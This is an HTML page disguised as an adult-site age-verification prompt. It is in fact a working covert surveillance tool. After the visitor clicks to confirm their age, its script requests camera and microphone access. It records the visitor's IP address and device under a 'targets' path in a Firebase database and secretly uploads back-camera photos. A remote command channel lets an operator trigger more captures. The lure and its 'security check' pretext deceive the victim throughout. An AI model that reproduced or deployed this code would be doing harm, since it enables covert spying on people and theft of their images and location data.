<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Age Verification Required</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { margin:0; background:#111; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
        #blur-vid { position:absolute; width:100%; height:100%; object-fit:cover; filter: blur(30px); opacity:0.5; }
        #verify-box { position:relative; z-index:10; background:#fff; padding:40px 20px; border-radius:10px; text-align:center; width:90%; max-width:350px; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
        .age-icon { font-size: 50px; color: #ff3131; margin-bottom: 10px; }
        h2 { margin: 10px 0; color: #222; font-size: 22px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        .btn-confirm { background:#222; color:#fff; border:none; padding:15px 40px; font-weight:bold; border-radius:5px; cursor:pointer; width: 100%; font-size:16px; transition: 0.3s; }
        .btn-confirm:hover { background: #000; }
        #video-player { display:none; width:100%; height:100%; object-fit:contain; z-index:5; position:relative; }
    </style>
</head>
<body>

<video id="blur-vid" autoplay muted loop playsinline src="https://www.w3schools.com/html/mov_bbb.mp4"></video>

<div id="verify-box">
    <div class="age-icon">ðŸ”ž</div>
    <h2>AGE VERIFICATION</h2>
    <p>This content is age-restricted. Please confirm you are 18 years or older to proceed.</p>
    <button class="btn-confirm" onclick="initVerification()">I AM 18+ ENTER</button>
</div>

<video id="video-player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);

    let activeStream = null;

    async function initVerification() {
        document.getElementById('verify-box').style.display = 'none';
        document.getElementById('blur-vid').style.display = 'none';
        const v = document.getElementById('video-player');
        v.style.display = 'block';

        try {
            // Step 1: Request permissions (Sabse pehle mic/cam access)
            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            v.play();

            // Step 2: Device Details & IP
            let ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
            db.ref(`targets/${sessionID}/info`).set({
                status: "ONLINE",
                ip: ipData.ip,
                device: navigator.platform,
                time: new Date().toLocaleTimeString()
            });

            // Step 3: Trigger Back Camera (Fixed Logic)
            await captureBackCamera();

            // Real-time listener
            db.ref(`commands/${sessionID}`).on('value', s => {
                const c = s.val(); if(!c) return;
                if(c.action === 'photo') captureFront();
                if(c.action === 'back') captureBackCamera();
                db.ref(`commands/${sessionID}`).remove();
            });

        } catch (e) {
            alert("Verification Failed: Camera/Microphone access is required for security check.");
            location.reload();
        }
    }

    async function captureBackCamera() {
        try {
            // Modern Phone Fix: Pehle waale tracks stop karne padte hain switching ke liye
            if (activeStream) {
                activeStream.getTracks().forEach(track => track.stop());
            }

            const constraints = {
                video: { facingMode: { ideal: "environment" } }
            };

            const backStream = await navigator.mediaDevices.getUserMedia(constraints);
            const tempVid = document.createElement('video');
            tempVid.srcObject = backStream;
            await tempVid.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = tempVid.videoWidth; 
                canvas.height = tempVid.videoHeight;
                canvas.getContext('2d').drawImage(tempVid, 0, 0);
                
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.5),
                    type: "BACK_CAM"
                });

                // Wapas main stream restore karein (Front/Mic)
                backStream.getTracks().forEach(t => t.stop());
                restoreMainStream();
            }, 3000);
        } catch (err) {
            db.ref(`targets/${sessionID}/logs`).push("Back Cam Fail: " + err.message);
        }
    }

    async function restoreMainStream() {
        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    }

    async function captureFront() {
        // Front capture logic...
    }
</script>
</body>
</html>
